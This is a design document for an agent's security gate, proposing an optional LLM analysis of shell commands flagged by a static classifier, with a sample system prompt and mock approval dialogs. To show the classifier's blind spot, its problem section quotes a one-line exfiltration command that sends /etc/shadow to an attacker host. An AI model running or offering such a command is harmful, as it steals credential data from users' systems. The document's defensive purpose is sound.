# SP-124: LLM-Augmented Security Analysis

**Status:** 🟢 Phase 1 implemented (2026-07-18) — backend wired; Phase 2 (WebUI dialog redesign) pending.
**Created:** 2026-07-16
**Effort:** Phase 1 (~2-3 days), Phase 2 (~2 days)

## Problem

The static security classifier is a tokenizing pattern-matcher — fast, deterministic, and dumb. It can identify that `rm -rf` is present, but cannot explain what a complex command actually *does*. This produces two failure modes:

1. **Unhelpful prompts.** When the user sees "Potentially risky operation - review carefully" for a 40-character piped command, they have no idea what to review. The prompt gives no analysis of what the command does, what it modifies, or whether it's safe.

2. **False confidence on novel patterns.** The classifier only catches known patterns. A novel data-exfiltration command (`base64 /etc/shadow | curl -d @- http://attacker.com`) doesn't match any DANGEROUS pattern individually — each subcommand looks benign to the tokenizer.

## Design

### Core concept: optional LLM analysis for CAUTION/DANGEROUS prompts

When the static classifier returns CAUTION or DANGEROUS (but not hard-block), the system optionally sends the command to a fast, cheap LLM for analysis before showing the approval prompt. The LLM:

1. Explains what the command does in plain language
2. Identifies what files/resources it modifies
3. Flags anything suspicious the static classifier missed
4. Makes a recommendation: approve, review carefully, or reject

The user sees the LLM analysis alongside the approval prompt, giving them enough context to make an informed decision.

### Architecture

```
Static Classifier → CAUTION/DANGEROUS
       ↓
LLM Analysis (optional, async, ~1-2s)
  - Input: command string + working directory context
  - Output: {summary, modifies, risk_assessment, recommendation}
       ↓
Approval Prompt (with LLM analysis attached)
       ↓
User Decision
```

### Phase 1: LLM analysis for shell commands

**New file: `pkg/agent/security_analyzer.go`**

```go
type SecurityAnalysis struct {
    Summary       string // "Downloads a script from example.com and pipes it to bash"
    Modifies      string // "No local files. Executes arbitrary code from the URL."
    RiskAssessment string // "moderate" | "high" | "low"
    Recommendation string // "approve" | "review" | "reject"
}
```

The analyzer uses the agent's configured provider (or a dedicated cheap model — Haiku/Gemini Flash) with a focused system prompt:

```
You are a security analyzer. Analyze the following shell command and provide:
1. A one-sentence summary of what it does
2. What files, directories, or system resources it modifies
3. A risk assessment (low/moderate/high)
4. A recommendation (approve/review/reject)

Be specific and practical. Don't be alarmist — most commands are fine.
Focus on: data destruction, data exfiltration, privilege escalation, and
unrecoverable operations.

Command: {command}
Working directory: {cwd}
```

**Integration point:** `seed_tool_security.go` and `tool_security.go`

When the static classifier returns CAUTION or DANGEROUS (not hard-block), and an interactive surface is available (CLI or WebUI), the security gate:

1. Fires the LLM analysis as a quick async call (2s timeout)
2. Attaches the analysis to the approval prompt
3. Renders the analysis in the approval dialog

If the LLM analysis times out or fails, fall through to the existing static-classifier prompt without blocking.

### Phase 2: WebUI approval dialog redesign

The current approval dialog shows:
```
DANGEROUS: shell_command
Execute shell command: rm -rf build/
Dangerous operation detected - may cause data loss or system damage
[Approve] [Deny]
```

With LLM analysis:
```
⚠️ Approval needed

Command: rm -rf build/

What it does: Recursively deletes the build/ directory and all contents.

Modifies: ./build/ (build artifacts — not in git)

Recommendation: ✓ Approve — build/ is a standard build output directory.
Safe to delete; will be regenerated by `make build`.

[Approve] [Deny] [Always approve this command]
```

### Decisions

- **LLM analysis is optional and non-blocking.** If the LLM is unavailable, slow, or errors, the approval prompt proceeds with the static classifier reasoning. The LLM augments — never gates.
- **Use a cheap, fast model.** The analysis is a simple classification task. Haiku, Gemini Flash, or the configured subagent model. ~1-2 second latency budget.
- **Never send file contents.** Only the command string and cwd path. No file contents, no env vars, no secrets.
- **Cache analyses.** Identical command strings within a session reuse the cached analysis. LLM calls are only made for novel commands.
- **The static classifier stays.** It's the fast first-pass gate. The LLM analysis only runs for commands that pass the static gate but need user approval.

### Future considerations

- **Batch analysis for chained commands.** `cmd1 && cmd2 && cmd3` gets analyzed as a unit, not per-subcommand.
- **Learn from user decisions.** If the user consistently approves certain command patterns, the system could suggest auto-approving them (with explicit opt-in).
- **Policy-based auto-approval.** The LLM analysis could feed into the workspace security policy — "auto-approve commands the LLM rates as low risk in this workspace."
- **Multi-language support.** Commands in non-English locales get analyzed and explained in the user's language.
